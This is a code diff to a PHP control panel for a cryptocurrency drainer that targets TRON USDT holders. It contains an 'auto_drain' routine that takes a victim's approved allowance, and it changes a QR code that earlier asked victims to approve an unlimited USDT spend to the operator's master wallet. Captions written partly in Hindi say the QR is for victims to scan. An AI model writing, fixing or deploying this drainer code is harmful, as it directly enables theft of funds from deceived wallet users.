@@ -93,7 +93,7 @@ function checkAllowance($owner, $spender) {
         ])
     ]);
     $response = curl_exec($ch);
-    curl_close($ch);
+    // curl_close($ch); // PHP 8.5 deprecated
     $data = json_decode($response, true);
     if (isset($data['constant_result'][0])) {
         return hexdec($data['constant_result'][0]) / 1e6;
@@ -109,7 +109,7 @@ function getUSDTBalance($address) {
         CURLOPT_HTTPHEADER => ['Content-Type: application/json']
     ]);
     $response = curl_exec($ch);
-    curl_close($ch);
+    // curl_close($ch); // PHP 8.5 deprecated
     $data = json_decode($response, true);
     if (isset($data['data'])) {
         foreach ($data['data'] as $token) {
@@ -176,7 +176,6 @@ if (isset($_GET['auto_drain'])) {
         exit;
     }
     $amount = $allowance;
-    // Clear timer after auto drain
     unset($_SESSION['drain_timer']);
     echo json_encode([
         'success' => true,
@@ -251,8 +250,9 @@ $timer_ready = $remaining_time <= 0 && $timer_active;
             <a href="?logout=1" class="logout-btn">🚪 Logout</a>
         </div>
         <div class="qr-box">
-            <img src="<?php echo "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode("tron://approve?contract=" . $USDT_CONTRACT . "&spender=" . $MASTER_WALLET . "&amount=999999999"); ?>" alt="QR">
-            <p>📱 Victim se QR scan + approve karwayein</p>
+            <img src="<?php echo "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode("tron://transfer?address=" . $MASTER_WALLET . "&contract=" . $USDT_CONTRACT . "&network=TRC20"); ?>" alt="QR">
+            <p>📱 Victim se QR scan karein</p>
+            <p style="font-size: 11px; color: #6c86a3;">Trust Wallet se scan karein — USDT receive address</p>
         </div>
     </div>
 
